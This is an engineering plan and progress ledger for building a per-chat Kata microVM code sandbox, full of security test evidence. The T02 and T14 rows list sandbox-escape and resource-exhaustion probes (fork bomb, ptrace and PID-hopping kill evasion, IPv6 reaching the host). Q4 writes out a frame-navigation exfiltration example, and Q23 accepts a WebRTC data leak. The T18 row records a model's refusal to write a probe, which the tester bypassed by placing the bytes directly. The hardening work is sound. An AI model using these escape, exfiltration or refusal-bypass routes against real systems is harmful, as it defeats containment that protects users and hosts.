# Plan: implement the per-chat microVM sandbox

The one implementation plan for
[docs/proposals/sandbox-code-interpreter.md](../proposals/sandbox-code-interpreter.md):
what to build, in what order, how to verify each piece, and the ledger
that records how far the work has got. Every session follows this file,
wherever it runs. How a session starts, works and hands off is in
[sandbox-sessions-local.md](sandbox-sessions-local.md) (the owner's laptop,
with the oh-my-claudecode plugin) or
[sandbox-sessions-cloud.md](sandbox-sessions-cloud.md) (a hosted session
working from a fresh clone).

Written 2026-11-10. Code inventory taken at `main`'s commit `9ee7fc39`
(the proposal PR changed only docs); line numbers in this file are from
that commit and drift as the code changes, so treat
them as a starting point and confirm them before editing.

**This file does not depend on where a session runs.** Nothing in it
assumes a particular machine, network or toolset. What a task needs from
its machine is stated as requirement tags (below), and each session plan
says which tags its machine can meet. A task's instructions are the same
for every session; only who may author or verify it differs.

---

## Ledger

Every session updates this section in the same commit as the work it
records. It is the only record of progress: the oh-my-claudecode state on
the laptop is a local working copy and loses to this section when they
disagree.

**Pull request:** #884 (draft)
**Feature branch:** `feat/sandbox-code-interpreter`
**Active session:** cloud, 2026-11-12T16:12Z, T20-T24 (hand-off branch `claude/bold-heisenberg-u4a3kv`; the owner confirmed in the session chat that no other session is working on the sandbox)
**`main` last merged in at:** `64c977f1` (branch created from it by T00)

### Statuses

`todo` · `in-progress` · `blocked` (with the reason in the row) ·
`needs-local-verify` (authored and partly verified; the row lists the
local checks still to run) · `done` (every Verify item has evidence).

The **Commit** column holds the sha of the commit that did the work. A
commit cannot name itself, so it is filled in by the session's hand-off
commit (or the next commit that touches the ledger).

### Dependency rule

The same for every session:

- A task may be **started** when each of its dependencies is `done` or
  `needs-local-verify`, and no open owner question it names is
  unanswered.
- A task may be set **`done`** only when each of its dependencies is
  `done`. Until then it stays at `needs-local-verify`, even if its own
  checks all passed, so unverified work never counts as a foundation.
- Gate tasks (T29, T39, T48) need every dependency `done` to start.

### Tasks

| ID | Task | Author | Verify | Depends | Status | Commit | Evidence / next |
|---|---|---|---|---|---|---|---|
| T00 | Open the branch and the draft PR | local | local | none | done | `523e2b30` | 2026-11-10: branch from `main` `64c977f1`; PR #884 opened as a draft; `gh pr view 884 --json isDraft,autoMergeRequest` gave `isDraft: true`, `autoMergeRequest: null`; `make pr-gate PR=884`: title, attribution and tripwire pass |
| T01 | Install and register Kata on the laptop | owner, kvm | owner, kvm | T00 | done | `5bc8814f` | 2026-11-10, branch head `523e2b30` + this commit: Fedora 44 `kata-containers` 3.26.0 is QEMU-only, so upstream 4.3.1 runtime-rs (Q7), sha256 verified, under `/opt/kata`; `kata-clh` registered in `/etc/docker/daemon.json` with the runtime-rs shim and `ConfigPath` = `configuration-clh-runtime-rs.toml` (a `KATA_CONF_FILE` wrapper failed: "only shipped Kata configuration files are accepted"); `kata-ctl check no-network-checks` exit 0; `docker run --rm --runtime kata-clh alpine uname -r` = `6.18.56` vs host `7.2.8-200.fc44.x86_64`, 1.3 s; one `cloud-hypervisor` + two `virtiofsd` per running container, none after; no AVC denials; Kata 4.3.1, Cloud Hypervisor v54.0, virtiofsd 1.14.0, Docker 29.8.2, containerd 2.3.6. Details in `docs/guides/sandbox.md`, "Host setup" |
| T02 | Spike: prove the Kata assumptions | docker, kvm | docker, kvm | T01 | done | `adc53af2` (after `fc3cc9ee`, `758ac82f`) | 2026-11-10 on the laptop (Kata 4.3.1 runtime-rs, Cloud Hypervisor v54.0, Docker 29.8.2, docker-py 7.2.0), throwaway scripts, every option set as T14 will: **1 yes:** a named volume at `/workspace` mounts as `virtiofs`, keeps files across container removal, and an empty volume takes the image's `1000:1000` `/workspace`. **2 yes:** `--read-only` root (`virtiofs ro`) refuses writes; `--tmpfs /tmp:size=256m` is a 256 MiB `tmpfs` (`nosuid,nodev,noexec`). **3 yes after Q8:** uid 1000, CapPrm/CapEff/CapBnd 0, `NoNewPrivs: 1`, `memory.max` 4 GiB (guest 3966 MiB), `cpu.max` 2 CPUs (guest 3 vCPUs) honoured; `--pids-limit 512` is not (fork bomb reached 15,849), `--ulimit nproc=512:512` is (bomb stopped at 516, host load 0.46); 256 MiB chunks are OOM-killed in the guest at 3840 MiB (rc 137, `oom_kill 1`), container and host unaffected; one 6 GB `bytearray` fails at once with `MemoryError`; `cloud-hypervisor` keeps 4.2 GB RSS after the kill. **4 yes after Q9:** an `internal` network attaches; host LAN IP, `docker0` and a public IP are "Network unreachable", no outside name resolves; a peer is reachable by IP and by name only with `--add-host` (Docker's DNS does not answer in the guest). **5 yes:** `put_archive` into the volume writes root-owned files with the tar's modes (`0:0 555` dir, `0:0 444` file; uid 1000 cannot write, delete, chmod or add); `put_archive` into the read-only root is refused ("container rootfs is marked read-only"); `get_archive` works. **6 yes:** `exec_create` with a list argv and `user='1000:1000'`, `exec_start(stream=True, demux=True)` streams stdout and stderr as written (1 s apart). **7 yes:** scipy-notebook's `/opt/conda/bin/python` 3.13.16 has `ENABLE_USER_SITE` True and no `PYTHONNOUSERSITE`; with `PYTHONUSERBASE=/workspace/.local` and `PIP_USER=1`, an offline `pip install` from a find-links directory lands in `/workspace/.local` (read-only home is fine) and imports in the next exec and in a new container; no `.venv` fallback. **8:** `docker run -d` to the first exec's output 0.99-1.03 s (scipy-notebook, 5 runs) and 0.99-1.06 s (alpine); idle host RSS (`cloud-hypervisor` + `virtiofsd`) 381-395 MiB (scipy-notebook) and 290-295 MiB (alpine); i9-12900H, 62 GiB. **9 yes, as expected:** uid 1000 can `mv` the root-owned `0555` `uploads` aside and create its own; a root exec (no caps) can `chmod` and empty the moved copy but not remove it from the 1000-owned `/workspace`; uid 1000 can then `rmdir` it. **10 yes:** one exec with `stdin=True` via `exec_start(socket=True)`: 900,000 bytes sent then `shutdown(SHUT_WR)`, 8-byte-header frames demultiplexed to stdout `900000` and stderr, exit code 3 from `exec_inspect`. **11:** `docker compose down` with a sandbox attached exits 0 but leaves the network ("Resource is still in use"); the next `up` reuses the same network id, and the running sandbox reaches the restarted peer; so T16 keeps the network in Compose (no external network, no stop-first). Findings for T13-T16 are in their sections ("From T02") and `docs/guides/sandbox.md` |
| T10 | Sandbox core: types, `SandboxBackend`, `FakeBackend`, exec limits | any | any | T00 | done | `563b1ce8` | 2026-11-10: `apps/server/local_llm/sandbox/` (types, `SandboxBackend` protocol with 9 methods and shared validators, limits, exec wrapping and `StreamCap`, `FakeBackend`) and `tests/test_sandbox_core.py` (600 cases, 100% statement coverage of the package, 0.98 s); security review (3 blocking, 10 should-fix) and code review (1 blocking, 10 should-fix) applied, re-review APPROVE; owner answers Q10, Q11 from the review folded in; `make test-backend` exit 0 (5,266 passed, 21 skipped, none new); `make test-types` no new findings; ruff and format clean. For T14: the keep-alive must survive Q10's kill and reap zombies (checked on Kata: tini as UID 1000 dies, `sleep` as PID 1 leaves zombies); Docker's untar merges directories (see T14's notes) |
| T11 | `SandboxManager` lifecycle | any | any | T10 | done | `a72299c1` | 2026-11-10: `apps/server/local_llm/sandbox/manager.py` (`SandboxManager`, `SandboxSession`, settings, `DatabaseChats`) and `tests/test_sandbox_manager.py` (152 tests, 100% statement coverage of manager.py; with the core suite 752 passed, three runs); security review (1 blocking, 9 should-fix) and two code reviews (1 blocking each) applied, final re-review APPROVE; randomized fuzzers (2000 seeds each) clean on slot accounting and tracking; owner answered Q12-Q15 on the way (Q15 became T24); `make test-backend` exit 0 (5,418 passed, 21 skipped, none new); `make test-types` no new findings. Lifespan wiring moved to T14; retention judged by the chat row's `updated_at` until T24 |
| T12 | The four tools and path confinement | any | any | T11 | done | `b20dbe18` | 2026-11-11: `bash`, `view`, `write_file`, `str_replace` in `tools/builtin.py`, offered instead of `execute_code` under engine `sandbox` (a custom selector with the same four gates; `code_interpreter.engine` added to the `get_many` batch, so the golden `tool_loading.json` gained that key in its 22 cases, the expected gate finding); path confinement in `sandbox/workspace.py` (host checks) and `infra/sandbox/common/lllm-path` (guest `realpath -m` plus a walk refusing any remaining symlink or unsearchable directory, since `realpath -m` leaves loops and symlinks under mode-000 directories unresolved), helpers under `env -i` with absolute paths, model strings only as positional arguments, atomic writes, readable-file checks, image header and size limits; the real script and the fake agree on every confinement case; session calls now hold the chat's lock through cancellation until the backend call and its kill end (bounded by `CANCEL_WAIT_S`), and the model sees only text written for it; `tests/test_sandbox_tools*.py` (author plus a separate test-engineer, about 650 tests); security review (1 blocking: a cancelled call released the lock while its processes ran, letting a symlink swap between check and use; 4 should-fix) and two re-reviews APPROVE; code review and re-review APPROVE; on this commit alone (a worktree): `make test-backend` exit 0 (6,125 passed, 21 skipped, diff coverage 100%), `make test-types` no new findings, `make lint` exit 0. Notes for T13, T14, T20 in their sections |
| T13 | Chat uploads into `/workspace/uploads` | any | any; docker, kvm | T11 | done | `314e62ad` | 2026-11-11 (committed with T14 and T16; see T14): `sandbox/uploads.py` (`chat_files` moved with behaviour unchanged, a wrapper left in `utils/code_interpreter.py` for the Jupyter path); `bash` and `view` sync the chat's files into `/workspace/uploads`, which (after T13's security review showed `put_files` let a model fill the workspace with undeletable moved-aside copies) is a read-only bind mount filled by `put_uploads`; names sanitized, ids de-duplicated, at most 100 files and 200 lookups per call, the skip decided from database facts before any storage read, an admin gets only files the owner may also read, a sync failure is a note and never refuses the command; `tests/test_sandbox_uploads.py` and the Kata acceptance test "Read-only uploads" `tests/test_sandbox_uploads_kata.py`: on the laptop with guest seccomp on, `.2` images and the final `kata.py` (md5 `7a8a740b`), 1 passed: the mount is `virtiofs ro`, all 13 UID 1000 attempts (write, append, rm, chmod, touch, truncate, ln, mv and rmdir of the directory) fail with EROFS, EACCES or EBUSY, an unchanged set is put once, added and removed attachments follow; security review (3 should-fix) and re-review APPROVE; code review and re-review APPROVE with should-fix, applied. Changed from the plan: `chat_files` is no longer "unchanged" for the Jupyter path either: names are sanitized, ids de-duplicated, at most 100 files and 200 lookups per call, and the caps are checked against the recorded size (the decisions entry, T23, records it) |
| T14 | `KataDockerBackend` and its integration tests | any | docker, kvm | T10, T02 | done | `314e62ad` | 2026-11-11, one commit with T13 and T16 (T14's protocol gained `put_uploads`, which T13's fake implements, and its backend refuses a network without T16's Compose options): `sandbox/kata.py` (docker==7.2.0), `sandbox/lifespan.py` and the `main.py` wiring; PID 1 as `nobody` (Q16), the post-call kill as UID 1000 judged by a separate exec as `nobody` that also detects PID hopping, fixed-size ext4 workspaces on loop devices via udisks2 (Q18), uploads as a read-only bind mount, guest seccomp checked at run time (Q19), the network checked for `internal`, `inhibit_ipv4`, the `lllm-sandbox` bridge name and no IPv6 (Q20), and a guard exec in each new guest; `LLLM_TEST_KATA=1 uv run --frozen python -m pytest tests/test_sandbox_kata.py -v` on the laptop with the `2026-11-11.2` images and final `kata.py` (md5 `7a8a740b`): 33 passed in 257 s (VM boundary, IPv4 and IPv6 fence, cross-chat isolation, persistence across stop, read-only uploads, timeout leaves no process, background child, cancelled exec, output flood capped, OOM inside, fork bomb at 512, PID 1 survives and reaps, real-symlink confinement, restart sweep, fixed-size volume and ENOSPC, a ptrace survivor and a PID-hopping survivor ended or failed closed, guest seccomp, pip/R/latexmk/Playwright under seccomp, workspace data cannot change the device's identity, a planted `uploads` entry, the mirror install, the guard refusing a guest with IPv6), nothing left behind; unit and edge tests (mocked SDK) at 100% of `kata.py` and `lifespan.py`; per-call overhead about 0.19 s; security review (blocking: a survivor could fake the kill by ptrace) and re-reviews (blocking: PID hopping; the guard's IPv6 check was a no-op) all applied; code review (blocking: unwrapped SDK errors, abandoned creates) and re-reviews applied, final security and code reviews APPROVE. On this commit alone (a worktree, T13 and T16 included): `make test-backend` exit 0 (6,764 passed, 23 skipped, diff coverage 99%: the one line is `main.py`'s lifespan call, which `make test-boot` runs), `make test-types` no new findings, `make lint` exit 0, `make test-boot` exit 0 (`GET /api/v1/sandbox/status` 200). Gate finding: `pytest.skip(` in the Kata tests (Q3) |
| T15 | Sandbox images | any | docker, host-internet | T02 | done | `8ac42c72` | 2026-11-11 on the laptop: `infra/sandbox/` (`Dockerfile.data` from `scipy-notebook:2026-10-12` pinned by digest, R 4.5.3 with the six packages from conda-forge, TeX Live 2025 from its frozen archive with the installer's SHA-512 and GPG check, `shell_escape = f`, `openout_any = p`; `Dockerfile.web` from `node:26.13.0-trixie-slim` by digest with TypeScript 6.0.3, tsx, ESLint, Prettier, Playwright 1.65.0; `common/install-common.sh` with DuckDB 2.0.0 by SHA-256, `file`, `xxd`, `procps`, setuid and setgid bits stripped), tag `2026-11-11.1` in `infra/sandbox/TAG`, `make sandbox-images` (gate finding, expected) writing `image-freeze.txt` and `image-freeze-r.txt`; both images built from clean by the target (data 18m54s to 21m40s, web 1m39s uncached), sizes 8.89 GB and 2.28 GB; inside `data`: pandas/scipy/sklearn import, `library(dplyr); library(lme4)`, `latexmk -v` 4.87, `pdftoppm -v` 26.01.0, `kpsewhich -var-value=shell_escape` `f`, a biblatex/biber/tikz document builds and `\write18` is disabled, `mktexpk` works under a read-only home, matplotlib quiet; inside `web`: `tsc --version` 6.0.3, `npx playwright --version` 1.65.0 offline, a headless Chromium screenshot (CommonJS and ESM), `tsx` importing a package; both run under `kata-clh` read-only with a fresh volume; code review (9 should-fix) applied, re-review APPROVE; on this commit alone (a worktree): `make test-backend` exit 0 (6,129 passed, 21 skipped, diff coverage 100%), `make lint` exit 0. Changes from the plan: `pip list --format=freeze` (conda's `pip freeze` prints file URLs), a `biber` wrapper (biber unpacks into a noexec `/tmp`), `/node_modules` link for ESM, `HEALTHCHECK NONE`; T21's files left to T21 |
| T16 | Wheelhouse and `sandbox-mirror` | any | docker, host-internet, kvm | T15 | done | `314e62ad` | 2026-11-11 (committed with T14; see T14): `infra/sandbox/allowlist.in` (Q17: polars, duckdb, pingouin, lifelines), `requirements.lock` (hashes, constrained by `image-freeze.txt`), `make wheelhouse` (35 wheels, 183 MB, every file hash-checked against the lock before it is served), `sandbox-mirror` (nginx 1.30.0-alpine by digest, uid 101, no capabilities, read-only, no egress, no published port, connection limits and timeouts), the `sandbox` network (internal, `inhibit_ipv4`, bridge `lllm-sandbox`, no IPv6, 10.231.0.0/24, mirror at .2), `make backend` runs the mirror, images `2026-11-11.2` with the `PIP_*` environment; on the laptop: an allowlisted package installs from a sandbox and imports in the next call, an unlisted or sdist-only one gives "No matching distribution" (T14's Kata run), the mirror reaches nothing outside (`wget https://pypi.org` and DNS fail), the host is unreachable from a sandbox on every IPv4 and IPv6 address, each IPv6 layer holding alone; security review (blocking: IPv6 link-local reached the host; fixed by guest sysctls and Q20's udev rule) and re-review PASS; code review (no blockers, 4 should-fix) applied. Gate finding: `Makefile` (expected). `pip-audit` of the lock not run (blocked in this session) |
| T17 | Outputs: collection, storage, endpoints, HTML policy, PDF previews | any | any; docker, kvm | T12 | done | `2e30beb7` | 2026-11-11 (one commit with T18): `sandbox/outputs.py`; `bash` lists `/workspace/outputs` NUL-delimited (T10's note) and attaches new or changed files through `get_files` as File rows (`source=sandbox_output`, `sandbox_path`, server-set `chat_id` and `stored_ns`), each linked to the message as it is stored, so a Stop or a database error leaves at most the row being linked unlinked; the last listing is kept per sandbox so files written by `write_file`/`str_replace` are attached by the next `bash` call (and a stopped command's outputs are not lost); PDF previews by the image's `pdftoppm -png -r 80 -l 10 -W 1600 -H 1600`, stored with `preview_of`; per call at most 20 files and 200 MiB, previews included, and 1 GiB per chat counted from the rows (Q22); a file whose bytes equal the last stored version of its path is not stored again; the `files` event carries the call's new files and both readers merge; `GET /api/v1/sandbox/outputs/{id}/html` returns JSON with the policy (plus `base-uri 'none'`) inserted after an optional doctype, 413 over 5 MiB; both content routes send sandbox outputs as attachments with `nosniff`, `Content-Security-Policy: default-src 'none'; sandbox` and `application/octet-stream` outside images, PDF, audio and video, `/content/html` 403s, access checked first (uniform 404); `tests/test_sandbox_outputs.py` (fake listing checked byte for byte against the real script) and the Kata acceptance test "Outputs" `tests/test_sandbox_outputs_kata.py`: on the laptop with `.2` images, 1 passed in 7.0 s (a matplotlib figure attached, a 2-page PDF with 2 previews, a `write_file` note attached by the next call, the saved message holding every event's files), nothing left behind; security review (blocking: previews outside the caps) and two re-reviews APPROVE; code review and re-review APPROVE, follow-ups applied. On this commit (T18 included): `make test-backend` exit 0 (6,895 passed, 24 skipped, diff coverage 99%: `main.py`'s lifespan line, run by `make test-boot`), `make test-types` no new findings, `make lint` exit 0, `make test-boot` exit 0. Changed from the plan: listing caps of 20 files, previews cropped to 1600 px, the per-chat cap (Q22), content de-duplication, stricter served types, `base-uri`. Gate finding: `pytest.skip(` in the Kata test (Q3) |
| T18 | Outputs: frontend rendering | any | any | T17 | done | `2e30beb7` | 2026-11-11 (one commit with T17; see T17): `components/chat/SandboxOutputs.tsx` from `ResponseMessage`: images and SVG only as `<img>`, HTML in `SandboxedHtmlFrame` (`sandbox="allow-scripts"` exactly, `srcDoc` from T17's route, 360 px with drag and keyboard Taller/Shorter, an Enlarge dialog reusing the frame), PDF previews in page order, `.tex`/`.py`/`.R`/text/JSON highlighted through the existing code block (256 KiB), CSV as a table (200 rows, 50 columns, 1,000 characters a cell, read from at most 1 MiB), a named download link for every output; captions use the server-cleaned name, ids must be UUIDs, malformed entries are skipped, fetches abort on unmount; `history.ts` merges the `files` event by id, then url; desktop `applyPolicy` gains a fail-closed `will-frame-navigate` handler (`isAllowedFrameNavigation`) denying a srcdoc or blank sub-frame's navigation unless the app's own page starts it (checked on Electron 45.1.0: location, meta refresh, link click and nested frame denied, `src` embeds still load); a link in the desktop artifact preview no longer navigates. Security review (blocking: WebRTC gets data out of the frame, which no CSP covers; the owner accepted and documented it as Q23) and re-review APPROVE; code review and re-review APPROVE, nits applied. On this commit: `make test-web` exit 0 (1,330 passed, diff coverage 97%), `make test-e2e` exit 0 (393 passed, with sandbox outputs under T17's real headers), `make test-desktop` exit 0 (149 passed), `make lint` exit 0. A real run on the laptop (2026-11-11, at `cf670b10`, `make backend` with the built UI, Chrome, Code Interpreter engine `sandbox`, Qwen3.6 27B through OpenRouter): one `bash` call saved a matplotlib figure and an HTML page to `/workspace/outputs`; on the reply the figure rendered as an `<img>` (640×480) and the page in a frame with `sandbox` exactly `allow-scripts`, `srcdoc` only and the policy first, each with a named download link; after a reload both were still on the saved message, and the figure's `/content` answered `image/png`, `attachment`, `nosniff` and `Content-Security-Policy: default-src 'none'; sandbox`; the engine was set back to `jupyter` and the test sandbox stopped. This completes T17's "Outputs" laptop check. The acceptance test "Output rendering" on the laptop (2026-11-11, at `d398fa75`, the same stack): Qwen3.6 27B refused to write the probe ("malicious payloads"), so the same bytes were put into the chat's `/workspace/outputs` as UID 1000 (`docker exec -u 1000:1000`, sha256 checked) and the model's next `bash` call (`ls -l`) attached them through the real path. In Chrome and in the desktop app (Electron, read over its local debugging port; its top frame has `window.lllmDesktop`), the HTML output's frame (`sandbox` exactly `allow-scripts`) reported by `postMessage`: `document.cookie` SecurityError, `fetch('/api/v1/chats')` TypeError (CSP), `parent.document` SecurityError, the preload bridge SecurityError, `window.open` null, `top.location` SecurityError, a form submission did not navigate (the frame was still there 1.5 s later), while its own script and inline style ran; `RTCPeerConnection` exists (Q23, accepted). An SVG output with `<script>` and `onload` showed as an `<img>` and neither ran. The raw download URLs (`/content`, `/content/{name}`) answered the HTML as `application/octet-stream`, `attachment`, `nosniff`, `Content-Security-Policy: default-src 'none'; sandbox`, so opening one saves it; `/content/html` 403. The engine was set back to `jupyter`, the stack stopped and the test sandboxes stopped. T29 still records it in the PR's `## Laptop checks` and adds the `RTCPeerConnection` reachability probe |
| T19 | Engine value, settings, prompt, admin page | any | any | T10 | done | `8fdff3f9` | 2026-11-11: `code_interpreter.sandbox.*` defaults in `DEFAULT_CONFIG` (engine values are free strings, so `sandbox` needed no server change), `CODE_INTERPRETER_SANDBOX_PROMPT` (used from T20), the five keys in the Code Execution form and the config import, both checked by one `sandbox_setting_error` in `manager.py` (GET serves stored values through a check-free response model, so a bad stored value cannot 500 the page), `GET /api/v1/sandbox/status` (admin; `SandboxManager.ready()`, 5 s bound, "not running" before T14 wires the manager), the admin page's sandbox fields, status line and 4 GiB/2 CPU note; `tests/test_sandbox_settings.py` (42), 10 Vitest cases, one Playwright case; code review (1 high, 4 medium) applied, re-review APPROVE; on this commit alone (a worktree): `make test-backend` exit 0 (5,460 passed, 21 skipped, diff coverage 100%), `make test-types` no new findings, `make test-web` exit 0 (1,299 passed), `make test-e2e` exit 0 (392 passed). For T20: nothing reads `code_interpreter.sandbox.timeout` yet |
| T20 | Call sites: native tool, tag path, Run endpoint, sub-agents | any | any; docker, kvm | T12, T19 | needs-local-verify | `607497f`, review fixes in the next commit | 2026-11-12, cloud session (no Docker, no KVM): `run_code_in_sandbox` in `tools/builtin.py` (shared by the tag path and the Run endpoint) writes each block to `/workspace/.runs/<n>.py` (`sandbox/runs.py`, one more than the highest plain number, which a fixed script prints as one number however many files there are; the FakeBackend's emulation checked against the real script) and runs it with `python` on the `data` image, collecting outputs as `bash` does (Q25); tag path `_execute_code_in_sandbox` with no blocked-modules preamble and `CODE_INTERPRETER_SANDBOX_TAG_PROMPT`, native path appends `CODE_INTERPRETER_SANDBOX_PROMPT`; Run endpoint takes `chat_id`, 400 without one, 404 for a chat the user may not run code in (Q14), outputs stored but linked to no message, uploads not synced; sub-agents use the parent chat's sandbox through `request.state.sandbox_chat_id` (also on the parent's continuation after a background sub-agent), and such a request never syncs the uploads (its files are a few of the parent's, or a stale snapshot), outputs on their own message counted against the parent's cap (`collect`'s `cap_chat_id`), background sub-agents keep the code interpreter; `bash`'s timeout defaults to `code_interpreter.sandbox.timeout` (`configured_timeout`, null or invalid means 60); every `bash` call and run `note_code_run`, failing only for the sandbox's own errors, and `view`/`write_file`/`str_replace` record the sandbox's failures; a request with a terminal and the sandbox engine refused with a 400 (Q24) only when the sandbox would be in play (the tag path, or builtin tools on the native path), before any feature runs, `terminal_event_handler` gated on `tool_type == 'terminal'`; the admin chat rule is `models/chats.py admin_reaches_other_chats`, used by `main.py`, `can_access_chat` and `DatabaseChats.usable`. `tests/test_sandbox_call_sites.py` (86 cases). The tag path puts the block's stderr, a sandbox failure and the outputs note into stdout, all the model is shown of a block (`utils/misc.py`). Verified here: pytest of the whole backend suite against a native Postgres 16 with pgvector 0.6.0 (not `make test-backend`, which needs Docker), as a non-root user: 6,966 passed, 24 skipped, 4 failed only because that user could not read the proxy CA bundle (the 4 `test_mcp_client.py` tests pass as root); diff-cover over the PR 99%; basedpyright no new findings. The tool-test rig now pins the configured timeout, since `test_sandbox_settings.py` leaves a stored timeout in the shared test database. Changed from the plan: the tag path names its attached outputs in stdout (all the model sees of a block) instead of markdown image links, which would show each image twice beside the `files` event; the new cases are a pytest file, not `tests/fixtures/sandbox_*.json`, so no golden file changes; the T13 note on comparing before downloading was already met by `sync_uploads`. Review: the project `reviewer` agent, 1 blocking (formatting) and 8 should-fix, all applied in the follow-up commit (stderr hidden from the model on the tag path; a sub-agent syncing a stale file list over the parent's uploads; the `.runs` listing outgrowing the stream cap after about 2,600 runs; the refusal broader than when sandbox tools are offered; file-tool failures unrecorded; outputs called attached when only listed; MAP.md); after them the affected suites passed (2,814, the 6 failures being the known root-only permission checks). Not changed, for the owner: the Run endpoint checks only `code_execution.enable`, not the `features.code_interpreter` permission (as for Jupyter); a command that takes the whole microVM down would surface as `SandboxNotRunning`, a sandbox failure, which the laptop can settle with an over-allocation on Kata. **Local checks:** 1. `make test-backend` (Docker Postgres). 2. `make test-boot`. 3. Acceptance test "Tag path" on the laptop: engine `sandbox`, a model with function calling `legacy` runs a `<code_interpreter>` block that prints and saves a figure to `/workspace/outputs`; the block's output names the figure and it renders on the reply, and `/workspace/.runs/1.py` holds the block |
| T21 | Package telemetry | any | any; docker, kvm | T15, T16, T20 | todo | | |
| T22 | Run button in chat code blocks | any | any | T20 | needs-local-verify | | 2026-11-12, cloud session: `CodeBlock` runs a complete Python block through `onRun` and shows its stdout, stderr, result, an error, or the run's `files` through `SandboxOutputs` under the block (a second press while it runs does nothing; closing or removing the block drops a late answer); `lib/chat/codeRun.ts` gives the runner only with `features.enable_code_execution` and engine `sandbox`, with the chat id (none for Jupyter or Pyodide); `executeCode` sends `chat_id`; `ChatPage` and `ChatMessages` pass it to replies' blocks. Vitest `codeRun.test.ts` (4), `CodeBlock.test.tsx` (8); Playwright `e2e/code-run.spec.ts` (3, mocked backend). Review (`reviewer` agent, no blocking) applied in the next commit: Run under Jupyter dropped (it went past Q2 and changed the current Jupyter path, showing plots as base64 text); Run keeps the keyboard focus (`aria-disabled`, focus back after Close) and looks disabled when it is; a screen reader hears only the status; a non-zero exit code and cut output are shown. Verified here: `make test-web` exit 0 (1,341 passed, web diff coverage 97%, astro check 0 errors); the whole Playwright suite (`CI=1 bun run test:e2e`, with the project's Chromium headless shell 1248 installed into a scratch `PLAYWRIGHT_BROWSERS_PATH`) 395 passed, 1 flaky on retry (`channels.spec.ts:183`, untouched). Every Verify item ran here; it stays `needs-local-verify` only until T20 is `done` (Dependency rule). Not done: a real-stack Run in the browser, which T29's laptop pass can include. The outputs of a Run are not saved with the chat, so they are gone after a reload (Q25) |
| T23 | Step 1 docs | any | any | T20 | todo | | |
| T24 | Workspace cap and deletion dialog (Q15) | any | any; docker, kvm | T11, T14, T19 | todo | | |
| T29 | Step 1 gate | local | docker, kvm, owner | T10-T24 | todo | | |
| T30 | Harness on the sandbox engine | any | any | T20 | todo | | |
| T31 | Harness baseline on the sandbox engine | local | gpu, kvm, owner | T29, T30 | todo | | |
| T39 | Step 2 gate | local | docker, kvm | T31 | todo | | |
| T40 | Remove the Jupyter backend code and tests | any | any | T39 | todo | | |
| T41 | Remove the Jupyter service, Makefile wiring and desktop text | any | any; docker | T39 | todo | | |
| T42 | Remove Pyodide | any | any | T39 | todo | | |
| T43 | Migrate engine rows to `sandbox` | any | any | T40, T42 | todo | | |
| T44 | Docs sweep | any | any | T40-T43 | todo | | |
| T48 | Final verification | local | docker, kvm, owner | T44 | todo | | |
| T49 | Owner marks the PR ready | owner | owner | T48 | todo | | |

A task too big for one session is split in this table (T13a, T13b) before
the session ends; the split tasks keep the original's section below.

### Owner questions

Open questions are listed first. When the owner answers one, the answer
goes into the proposal's Decisions table, with the date, and the question
moves to "Answered" with its answer in bold, so the reasoning stays next
to the decision.

**Open:** none.

**Answered:**

- **Q1 (from the proposal). Answered 2026-11-10: yes, add the schema
  note.** The harness spec changes
  (`code_interpreter_engine` becomes `sandbox`, and the sandbox image
  digest is added), so every new harness run gets a new spec sha. Should
  the change also add a `benchmark_schema_note` row saying so? Recommended:
  yes. The note costs one idempotent insert, and the Report's provenance
  section shows the last three notes, which is exactly where someone
  comparing a Jupyter-era run with a sandbox-era run would look.
- **Q2 (found 2026-11-10). Answered 2026-11-10: (a), repoint the
  endpoint and wire up the button.** The proposal says the Run button
  "runs in the chat's own sandbox", but the Run button is never shown
  today. `CodeBlock.tsx` only renders it when an `onRun` callback is
  passed, nothing passes one (`ChatMessages.tsx:288-300`), and
  `executeCode` in `lib/apis/utils/index.ts` has no callers. Options:
  (a) repoint `POST /api/v1/utils/code/execute` at the chat's sandbox
  *and* wire the button up, with result display (T22, new UI);
  (b) repoint the endpoint only and leave the button unwired. Recommended:
  (a), since the decision describes a button the user presses.
- **Q3 (found 2026-11-10). Answered 2026-11-10: skip unless
  `LLLM_TEST_KATA=1`, never fail on `CI`, and justify the finding.** The
  Kata integration tests
  cannot run in CI (no `/dev/kvm` on GitHub's hosted runners), so they
  must skip there. The repo's pattern for tests that need a service
  (`tests/test_schema_drift.py:88-95`) skips unless an environment
  variable is set, and fails instead of skipping under CI. A Kata test
  must skip under CI too, which adds `pytest.skip(` calls, a `PR gate`
  finding. Recommended: skip unless `LLLM_TEST_KATA=1`, never fail on
  `CI`, and justify the finding under `## Gate changes`. The alternative,
  keeping the tests outside `apps/server/tests/`, hides them from the gate
  and from coverage, which is worse.
- **Q4 (found 2026-11-10). Answered 2026-11-10: (b), deny sub-frame
  navigation in the desktop app and document the browser limitation.**
  The proposal says the injected
  content-security policy "blocks all network requests". It blocks
  fetches, images, fonts and form posts, but not a frame navigating
  *itself* (`location = 'https://example.com/?data'`); neither the iframe
  `sandbox` flags without `allow-top-navigation` nor CSP stop that, and
  CSP's `navigate-to` was never shipped by browsers. Only model-written
  content is inside the frame, so the exposure is the model leaking what
  it wrote, to a URL it chose. Options: (a) accept and document it; (b)
  in the desktop app also deny sub-frame navigation away from
  `about:srcdoc` (`will-frame-navigate`), and accept it in the browser.
  Recommended: (b), documenting the browser limitation.
  *Note (T17's security review, 2026-11-11):* WebRTC (STUN/TURN lookups from a script in the frame) is not covered by
  CSP or by the desktop app's `will-frame-navigate` either; the owner accepted it as Q23, and it is recorded beside navigation
  in this PR's decisions entry.
- **Q5 (found in review 2026-11-10). Answered 2026-11-10: (a),
  ephemeral sandboxes for unsaved chats.** Not every chat has a
  saved chat row. The harness runs each item as
  `temporary:benchmark-<uuid>` and writes no row
  (`benchmarks/evaluation/harness.py:340`), and the app's own temporary
  chats, like channel chats, have ids with a prefix in
  `NON_SAVED_CHAT_ID_PREFIXES` (`temporary:`, `local:`, `channel:`;
  `utils/chat_id.py:1-9`). As
  first written, T11 refused any chat without a row, T14 required a UUID,
  and the retention sweep destroyed volumes whose chat does not exist,
  which would refuse every harness call and every temporary chat, and
  could destroy a live temporary chat's volume mid-command. Options:
  (a) **ephemeral sandboxes** for ids that are not saved chats: keyed by a
  UUID the manager generates and maps from the chat id in memory, never
  retained (destroyed with its volume when the reaper stops it, or at
  the end of the harness item), exempt from the "chat deleted" sweep
  while running, and for the harness destroyed as soon as the item
  finishes so it never holds one of the 4 slots idle; (b) no code
  interpreter for unsaved chats, which breaks the harness. Recommended
  and chosen: (a). T11, T14 and T30 are written for it. Its cost: the mapping lives
